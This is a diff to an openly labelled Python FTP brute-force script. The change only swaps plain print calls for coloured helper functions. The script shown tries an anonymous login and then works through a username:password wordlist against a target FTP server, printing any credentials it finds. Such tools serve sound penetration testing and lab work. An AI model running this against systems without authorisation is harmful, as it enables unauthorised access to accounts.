@@ -7,6 +7,7 @@ This program automatize ftp bruteforce login attempt
 import argparse
 import sys
 from ftplib import FTP, all_errors
+from utils import print_success, print_info, print_error
 
 def parse():
     '''This function tests the FTP authentication'''
@@ -25,9 +26,9 @@ def ftp_login(target, username, password):
         ftp = FTP(target)
         ftp.login(username, password)
         ftp.quit()
-        print("\n[!] Credentials have found.")
-        print(f"\n[!] Username : {format(username)}")
-        print(f"\n[!] Password : {format(password)}")
+        print_success("\n[!] Credentials have found.")
+        print_success(f"\n[!] Username : {format(username)}")
+        print_success(f"\n[!] Password : {format(password)}")
         sys.exit(0)
     except all_errors:
         pass
@@ -43,7 +44,7 @@ def brute_force(target, wordlist):
                 ftp_login(target, word.split(':')[0], word.split(':')[1])
 
     except FileNotFoundError:
-        print("\n[-] There is no such wordlist file. \n")
+        print_error("\n[-] There is no such wordlist file. \n")
         sys.exit(0)
 
 def main():
@@ -53,16 +54,16 @@ def main():
     parser.add_argument("-w", "--wordlist")
 
     args = parser.parse_args()
-    print("Testing anonymous login")
+    print_info("Testing anonymous login")
     target = args.target
     ftp_login(target, "anonymous", "anonymous")
 
     if args.wordlist:
         wordlist = args.wordlist
         brute_force(target, wordlist)
-        print("\n[-] Brute force finished. \n")
+        print_info("\n[-] Brute force finished. \n")
     else :
-        print("No file was provided for bruteforce")
+        print_error("No file was provided for bruteforce")
 
 if __name__=='__main__':
     main()
